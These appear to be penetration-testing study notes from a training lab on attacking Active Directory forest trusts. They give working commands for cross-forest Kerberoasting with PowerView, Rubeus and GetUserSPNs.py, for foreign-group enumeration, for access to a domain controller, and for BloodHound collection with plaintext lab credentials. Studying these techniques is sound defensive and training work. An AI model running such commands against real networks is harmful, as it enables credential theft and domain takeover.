### Content

- [From Windows](#from-windows)
	- [Cross-Forest Kerberoasting](#cross-forest-kerberoasting)
	- [Admin Password Re-Use](#admin-password-re-use)
	- [Group Membership](#group-membership)
- [From Linux](#from-linux)
	- [Cross-Forest Kerberoasting](#cross-forest-kerberoasting)

---

> [!Note]
> Suppose we can Kerberoast across a trust and have run out of options in the current domain. In that case, it could also be worth attempting a single password spray with the cracked password, as there is a possibility that it could be used for other service accounts if the same admins are in charge of both domains. Here, we have yet another example of iterative testing and leaving no stone unturned.
> 
> - Sometimes you cannot escalate privileges in your current domain, but instead can obtain a Kerberos ticket and crack a hash for an administrative user in another domain that has Domain/Enterprise Admin privileges in both domains.

# From Windows
#### Cross-Forest Kerberoasting

``` PowerShell
# Use powerview to enumerate usefull SPNs
PS C:\> Get-DomainUser *  -Domain FREIGHTLOGISTICS.LOCAL -spn | select samaccountname,memberof,serviceprincipalname | fl

# Kerberoasting attack across the trust using Rubeus
PS C:\> .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap

# Crack it with hashcat or john
```

#### Admin Password Re-Use

If two domains in a bidirectional forest trust are managed by the same company, and a privileged account in Domain A shares almost the same username as one in Domain B, it may also share the same password as one in Domain B. So compromising Domain A can lead to full control over Domain B due to password reuse. ex `adm_bob.smith` and `bsmith_admin`

#### Group Membership

We may see users or admins from Domain A as members of a group in Domain B.
Only `Domain Local Groups` allow security principals from outside its forest. We may see a Domain Admin or Enterprise Admin from Domain A as a member of the built-in Administrators group in Domain B in a bidirectional forest trust relationship. If we can take over this admin user in Domain A, we would gain full administrative access to Domain B based on group membership.

``` PowerShell
# Using PowerView to enumerate groups with users that do not belong to the domain
# Use `Convert-SidToName {SID-RID}` to resolve the Membername from the ouput
PS C:\ Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL

GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=FREIGHTLOGISTICS,DC=LOCAL
MemberDomain            : FREIGHTLOGISTICS.LOCAL
MemberName              : S-1-5-21-3842939050-3880317879-2865463114-500
MemberDistinguishedName : CN=S-1-5-21-3842939050-3880317879-2865463114-500,CN=ForeignSecurityPrincipals,DC=FREIGHTLOGIS
                          TICS,DC=LOCAL
....[SNIP]....
PS C:\> Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500

INLANEFREIGHT\administrator

# administrator from INLANEFREIGHT domain is a member of Administrators group from FREIGHTLOGISTICS
# We Access a DC in FREIGHTLOGISTICS as the user administrator from INLANEFREIGH
PS C:\> Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator

```

---
# From Linux
#### Cross-Forest Kerberoasting

```bash
# List the SPNs available for kerberoasting
$ GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley

# Extract their TGS tickets
$ GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
# crack this offline using Hashcat with mode 13100
```

#### Group Membership

Detect it through bloodhound

``` bash
# Parent domain info gathering
$ bloodhound-python -c All -d 'INLANEFREIGHT.LOCAL' -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 --dns-tcp
$ zip -r inlanefreight_bloodhound.zip *.json

# Child domain info gathering
$ bloodhound-ce-python -c All -d 'FREIGHTLOGISTICS.LOCAL' -u 'forend@inlanefreight.local' -p 'Klmcargo2' -ns 172.16.5.238 --dns-tcp
$ zip -r freightlogistics_bloodhound.zip *.json
```
